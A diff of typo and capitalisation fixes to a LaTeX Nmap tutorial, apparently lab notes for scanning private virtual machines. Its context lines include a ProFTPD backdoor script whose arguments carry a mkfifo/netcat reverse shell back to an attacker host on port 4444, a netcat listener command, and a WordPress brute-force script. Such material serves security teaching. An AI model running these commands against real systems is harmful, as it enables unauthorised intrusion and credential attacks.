@@ -28,7 +28,7 @@ Nmap can determine:
 Nmap allows us to know how the network really is as opposed to how it should be.
 
 \section{Basic Usage}
-\subsection{Command sintax}
+\subsection{Command Syntax}
 
 \indent\texttt{\# nmap [Scan Type] [Options] \{targets\}}\\
 
@@ -54,13 +54,13 @@ This will ping and then scan for the top-1000 most used TCP ports, but for the e
 
 \texttt{\# nmap 192.168.56.16-19}
 
-This is equal to the previous example. In this case, we use a list of IP addresses.\\
+This is the same to the previous example. In this case, we use a list of IP addresses.\\
 
 \texttt{\# nmap -iL targets.txt}
 
 This will ping and then scan the top-1000 most used TCP ports, based on the hosts in the list.
 
-\section{Modifying the standard scan}
+\section{Modifying The Standard Scan Command}
 
 There are different types of options, the ones related to ports allow us to:
 
@@ -83,7 +83,7 @@ This will scan the top-100 ports. This is called a fast scan.\\
 
 \texttt{\# nmap -p- 192.168.56.16}
 
-This will scann all ports in the target.\\
+This will scan all ports in the target.\\
 
 \texttt{\# nmap -p22,80,443 192.168.56.17}
 
@@ -99,7 +99,7 @@ This will scan the top-10 most used UDP ports.
 
 \section{Timing}
 
-Nmap automatically controlls the speed of the scan based on network congestion. However, we can overwrite this with \texttt{-T0} (paranoid), \texttt{-T1} (sneaky), \texttt{-T2} (polite), \texttt{-T3} (normal), \texttt{-T4} (aggressive), \texttt{-T5} (insane).
+Nmap automatically controls the speed of the scan based on network congestion. However, we can overwrite this with \texttt{-T0} (paranoid), \texttt{-T1} (sneaky), \texttt{-T2} (polite), \texttt{-T3} (normal), \texttt{-T4} (aggressive), \texttt{-T5} (insane).
 
 \subsection{Examples}
 
@@ -110,14 +110,14 @@ Nmap automatically controlls the speed of the scan based on network congestion. 
 In these examples we can compare the time that nmap takes to complete both scans. When scanning a VM, the time difference might be very small.
 
 
-\section{Getting more information from nmap}
+\section{Getting More Information from Nmap}
 
 The additional information we can get from nmap includes:
 
 \begin{itemize}
     \item OS fingerprinting,
     \item service name and version,
-    \item vulnerabilities
+    \item vulnerabilities.
 \end{itemize}
 
 \subsection{Examples}
@@ -138,7 +138,7 @@ This will get additional information from services.\\
 
 This will perform all the previous examples, plus a traceroute.
 
-\section{Saving the output}
+\section{Saving the Output}
 
 Nmap allows us to save the output in different formats
 
@@ -158,7 +158,7 @@ Where:
 
 \section{Scripts}
 
-Scripts extends the behavior of nmap. Scripts are run after open ports have been discovered.\\
+Scripts extend the behavior of nmap. Scripts are run after open ports have been discovered.\\
 
 Scripts allows us to:
 
@@ -186,7 +186,7 @@ This will show the content of the robots.txt file.\\
 
 \texttt{\# nmap -sV --script="ftp-proftpd-backd*" 192.168.56.19}
 
-This will verify if the target is vulnerable to a specific vulnerability.\\
+This will check if the target is vulnerable to a specific vulnerability.\\
 
 \texttt{\# nmap -sV --script="ftp-proftpd-back*" --script-args="cmd=ls" 192.168.56.19}
 
@@ -194,7 +194,7 @@ This will list the content of a directory. We do this by modifying the arguments
 
 \texttt{\# nmap -sV --script="ftp-proftpd-back*" --script-args="cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>\&1|nc 192.168.56.1 4444 >/tmp/f" 192.168.56.19}
 
-This will generate a remote connection back to the attacker machine. You will need to have a netcat listener at port 4444 in your host machine. In Kali linux, you can use \texttt{nc -lvnp 4444} in a different terminal.\\
+This will generate a remote connection back to the attacker's machine. You will need to have a netcat listener at port 4444 in your host machine. In Kali linux, you can use \texttt{nc -lvnp 4444} in a different terminal.\\
 
 \texttt{\# nmap -sV --script="http-wordpress-brute*" --script-args="passdb=./dict.txt"}
 
